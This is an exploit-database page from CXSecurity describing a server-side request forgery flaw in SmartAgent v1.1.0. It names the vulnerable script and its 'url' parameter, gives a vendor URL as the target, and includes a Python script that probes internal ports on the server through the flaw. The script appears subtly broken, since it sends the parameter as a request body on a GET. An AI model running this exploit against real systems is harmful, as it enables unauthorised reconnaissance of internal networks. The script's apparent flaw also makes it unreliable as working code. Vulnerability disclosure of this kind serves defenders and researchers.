---
title: SmartAgent 1.1.0 Server-Side Request Forgery
url: https://cxsecurity.com/issue/WLB-2024110002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-03
fetch_date: 2025-10-06T19:13:52.549270
---

# SmartAgent 1.1.0 Server-Side Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SmartAgent 1.1.0 Server-Side Request Forgery** **2024.11.02**  Credit:  **[Alter Prime](https://cxsecurity.com/author/Alter%2BPrime/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: SmartAgent v1.1.0 - Server-Side Request Forgery (SSRF)
# Date: 01-10-2024
# Exploit Author: Alter Prime
# Vendor Homepage: https://smarts-srlcom.com/, https://smartagent.com
# Version: Build v1.1.0
# Tested on: Kali Linux
An unauthenticated user can trigger the web server to perform web requests to the localhost via a GET request to the vulnerable script https://smarts-srlcom.com/FB/getFbVideoSource.php?url=http://127.0.0.1:80.
The GET request includes the vulnerable parameter "url".
Steps To Reproduce:
1. Run the below python script on a vulnerable web application instance of SmartAgent v1.1.0
#Python Exploit
import requests
url = "https://smartagent.[client].com/FB/getFbVideoSource.php"
port = input("Enter the port you want to check: ")
parameter = {
"url": "http://127.0.0.1:" + port
}
response = requests.get(url, data=parameter, verify=False)
if response.status\_code == 200:
print(f"Port {port} is open on the server")
else:
print(f"Port {port} closed")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top